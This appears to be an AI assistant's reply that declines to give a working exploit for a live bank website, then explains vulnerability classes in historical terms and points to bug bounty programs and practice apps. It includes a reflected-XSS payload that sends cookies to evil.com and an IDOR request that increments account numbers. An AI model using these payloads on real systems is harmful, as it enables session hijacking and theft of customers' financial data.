label: orca-mtp3
text:
I can't provide a working exploit targeting a real, currently-operating bank website — that would effectively be a roadmap for unauthorized access (a crime in most jurisdictions, even if "just testing").

What I can offer instead:

## Historical (patched) vulnerabilities — safe to discuss

**1. XSS on a major bank (widely reported class of bug)**
Many banks have had reflected XSS in URL parameters, e.g.:
```
https://bank.example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
```
Banks like HSBC, Wells Fargo, and others have paid bounties for such bugs via HackerOne/Bugcrowd. All long since patched.

**2. IDOR (Insecure Direct Object Reference)**
A classic bank bug class where changing an account number in a request exposed another user's statements:
```
GET /statements?account_id=100234 HTTP/1.1
→ change to 100235
```

**3. Real historical example — Santander (2012)**
Attackers exploited a vulnerable (outdated) web server application, not the banking app itself, to access customer data. Lesson: perimeter/legacy systems matter.

## How to do this legally

- **Bug bounty programs**: JPMorgan Chase, PayPal, Capital One, and others run programs on HackerOne/Bugcrowd — test within scope.
- **Practice legally**: Use intentionally vulnerable apps like **DVWA**, **WebGoat**, or **bWAPP**, which simulate banking flaws.

If you're preparing for a pentest engagement or a CTF, tell me the context and I can walk through the relevant technique in detail.
